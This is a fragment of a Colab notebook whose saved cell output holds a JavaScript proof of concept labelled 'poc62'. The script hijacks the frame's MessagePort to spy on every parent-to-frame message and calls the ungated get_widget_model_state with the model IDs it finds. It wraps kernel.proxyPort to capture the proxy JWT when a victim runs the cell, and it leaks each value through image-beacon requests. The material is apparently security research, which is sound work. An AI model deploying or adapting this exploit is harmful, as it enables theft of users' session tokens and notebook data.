      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# poc62 \u2014 incoming lk.g message spy + get_widget_model_state\n\nHooks capturedPort.onmessage to see ALL parent\u2192frame messages.\nCalls get_widget_model_state (ungated) for any model UUIDs found.\nAlso intercepts proxy JWT passively."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "poc62_spy"
      },
      "source": [
        "# poc62: incoming message spy + widget state enumeration"
      ],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "(function(){\n  var B='https://colab.research.google.com/__poc62';\n  var L=function(t,v){new Image().src=B+'/'+t+'?v='+encodeURIComponent(String(v||'').slice(0,900));};\n  L('start',location.origin);\n\n  var gc=window.google&&window.google.colab;\n  if(!gc){L('gc','missing');return;}\n  L('gc','ok');\n\n  var capturedPort=null;\n  var incomingMsgs=[];\n\n  // \u2500\u2500 Step 1: capture lk.g via postMessage spy \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  var origPPM=MessagePort.prototype.postMessage;\n  MessagePort.prototype.postMessage=function(){\n    if(!capturedPort){\n      capturedPort=this;\n      L('port-captured','ok');\n\n      // \u2500\u2500 Step 2: spy on ALL INCOMING messages from parent \u2192 this frame \u2500\u2500\n      // Hook onmessage BEFORE output_binary.js registers its own handler\n      // so we see every message the parent sends to the frame\n      var origOnMsg=Object.getOwnPropertyDescriptor(MessagePort.prototype,'onmessage');\n      var patchTarget=this;\n      var realOnMsg=null;\n\n      Object.defineProperty(patchTarget,'onmessage',{\n        get:function(){return realOnMsg;},\n        set:function(fn){\n          realOnMsg=fn;\n          // wrap the real handler with our spy\n          patchTarget._spyWrapper=function(e){\n            try{\n              var d=e&&e.data;\n              var s=JSON.stringify(d||{}).slice(0,400);\n              incomingMsgs.push(s);\n              L('INCOMING',s);\n              // look for model IDs (UUIDs in widget messages)\n              if(d&&d.msg_type){\n                L('MSG_TYPE',d.msg_type+'|'+JSON.stringify(d).slice(0,300));\n              }\n              if(d&&d.modelId){\n                L('MODEL_ID',d.modelId);\n                trySpy(d.modelId);\n              }\n              // look for comm_open / widget model state messages\n              if(d&&d.content&&d.content.comm_id){\n                L('COMM_ID',d.content.comm_id);\n                trySpy(d.content.comm_id);\n              }\n            }catch(err){}\n            if(realOnMsg) realOnMsg.call(this,e);\n          };\n          // apply the wrapper\n          Object.getOwnPropertyDescriptor(MessagePort.prototype,'onmessage')\n            &&origOnMsg&&origOnMsg.set\n            &&origOnMsg.set.call(patchTarget,patchTarget._spyWrapper);\n        },\n        configurable:true\n      });\n      L('onmsg-hooked','ok');\n    }\n    return origPPM.apply(this,arguments);\n  };\n\n  // \u2500\u2500 Step 3: try get_widget_model_state with a discovered modelId \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  function trySpy(modelId){\n    if(!capturedPort){return;}\n    try{\n      capturedPort.postMessage({\n        action:'get_widget_model_state',\n        target:'kernel',\n        modelId:modelId\n      });\n      L('GET_WIDGET_SENT',modelId);\n    }catch(e){L('GET_WIDGET_ERR',e.message.slice(0,100));}\n  }\n\n  // \u2500\u2500 Step 4: trigger port activity to capture lk.g \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  try{gc.files.view('/poc62_trigger',0);L('view-sent','ok');}\n  catch(e){L('view-err',e.message.slice(0,80));}\n\n  // \u2500\u2500 Step 5: enumerate known widget IDs via kernel state if accessible \u2500\u2500\u2500\n  // get_widget_model_state is completely ungated \u2014 try with placeholder IDs\n  // to confirm the message reaches the parent and what the response looks like\n  setTimeout(function(){\n    if(!capturedPort){L('no-port','timeout');return;}\n\n    // Try with a fake UUID to see what response format looks like (should error/null)\n    var fakeId='00000000-0000-0000-0000-000000000000';\n    capturedPort.postMessage({action:'get_widget_model_state',target:'kernel',modelId:fakeId});\n    L('PROBE_FAKE_ID',fakeId);\n\n    // Hook port.onmessage to see ALL responses (the parent's reply to our messages)\n    // The real handler is registered by output_binary.js \u2014 wrap it\n    if(capturedPort.onmessage){\n      var existingHandler=capturedPort.onmessage;\n      capturedPort.onmessage=function(e){\n        try{\n          var d=e&&e.data;\n          L('RESP_MSG',JSON.stringify(d||{}).slice(0,500));\n        }catch(x){}\n        return existingHandler.call(this,e);\n      };\n      L('resp-hooked','ok');\n    } else {\n      // set it fresh\n      capturedPort.onmessage=function(e){\n        try{\n          var d=e&&e.data;\n          L('RESP_MSG',JSON.stringify(d||{}).slice(0,500));\n        }catch(x){}\n      };\n      L('resp-set','ok');\n    }\n\n    // Also passive: intercept proxy port for JWT when victim runs cell\n    try{\n      var origKPP=gc.kernel.proxyPort.bind(gc.kernel);\n      gc.kernel.proxyPort=function(port,cache){\n        var p=origKPP(port,cache);\n        if(p&&p.then){\n          p.then(function(url){L('PROXY_JWT',String(url).slice(0,800));})\n           .catch(function(e){L('PROXY_REJ',String(e).slice(0,150));});\n        }\n        return p;\n      };\n      L('proxy-hooked','ok');\n    }catch(e){L('proxy-hook-err',e.message.slice(0,80));}\n\n  },600);\n\n})();",
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
          "metadata": {}
        }
      ],
      "execution_count": 1
    }
  ]
}